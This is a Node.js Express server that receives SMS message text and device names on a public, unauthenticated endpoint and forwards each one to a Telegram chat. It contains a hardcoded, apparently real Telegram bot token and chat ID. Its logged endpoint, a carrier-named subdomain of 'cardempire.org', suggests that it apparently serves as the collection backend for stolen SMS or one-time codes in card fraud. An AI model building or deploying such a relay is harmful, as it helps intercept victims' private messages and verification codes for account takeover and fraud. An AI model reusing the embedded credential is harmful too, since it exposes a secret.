import express from "express";
const app = express();
const PORT = process.env.PORT || 10000;

// ============================================================
// TELEGRAM CREDENTIALS
// ============================================================
const TELEGRAM_BOT_TOKEN = "8712348926:AAGSgG2F5_xOGWkNEoMfmn6Fr7AtBPG6_u0";
const TELEGRAM_CHAT_ID = "-1004392052306";

const TELEGRAM_API_URL = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;

// ============================================================
// MIDDLEWARE
// ============================================================
app.use(express.json());

// ============================================================
// ROUTES
// ============================================================

// Health check
app.get("/", (req, res) => {
  res.json({ 
    status: "ok", 
    message: "Webhook host is running",
    endpoints: {
      verify: "POST /verify"
    }
  });
});

// GET route for testing /verify
app.get("/verify", (req, res) => {
  res.json({ 
    status: "ok", 
    message: "Verify endpoint is active. Send POST requests here.",
    method: "POST",
    required_fields: ["message", "device_name"],
    auth: "No authorization required (public endpoint)"
  });
});

// Main webhook endpoint - /verify (NO FILTERING, NO AUTH)
app.post("/verify", async (req, res) => {
  try {
    // 1. Get data from request
    const { message, device_name } = req.body;
    
    console.log("📨 Webhook request received");
    console.log("📦 Data:", req.body);
    
    // 2. Format Telegram message (NO FILTERING - everything goes through)
    const deviceName = device_name || "Unknown Device";
    const timestamp = new Date().toLocaleString();
    
    const telegramText = `📱 New SMS received 🍆💪\n\n🎯 ${deviceName}\n✍️ ${message || "No message content"}\n🕐 ${timestamp}`;

    console.log("📤 Sending to Telegram...");

    // 3. Send to Telegram
    const telegramResponse = await fetch(TELEGRAM_API_URL, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        chat_id: TELEGRAM_CHAT_ID,
        text: telegramText,
        parse_mode: "HTML",
        disable_web_page_preview: true,
      }),
    });

    const telegramResult = await telegramResponse.json();

    if (!telegramResponse.ok) {
      console.error("❌ Telegram error:", telegramResult);
      return res.status(500).json({ 
        error: "Failed to send Telegram message",
        details: telegramResult 
      });
    }

    console.log("✅ Telegram sent successfully!");
    
    // 4. Success
    res.json({ 
      success: true, 
      message: "SMS forwarded to Telegram" 
    });

  } catch (error) {
    console.error("❌ Error:", error);
    res.status(500).json({ 
      error: "Internal server error",
      details: error.message 
    });
  }
});

// ============================================================
// START SERVER
// ============================================================
app.listen(PORT, "0.0.0.0", () => {
  console.log(`🚀 Webhook host running on port ${PORT}`);
  console.log(`📡 Endpoint: https://verizon.cardempire.org/verify`);
  console.log(`🔓 No authorization required (public endpoint)`);
  console.log(`📨 No filtering - all messages forwarded`);
});
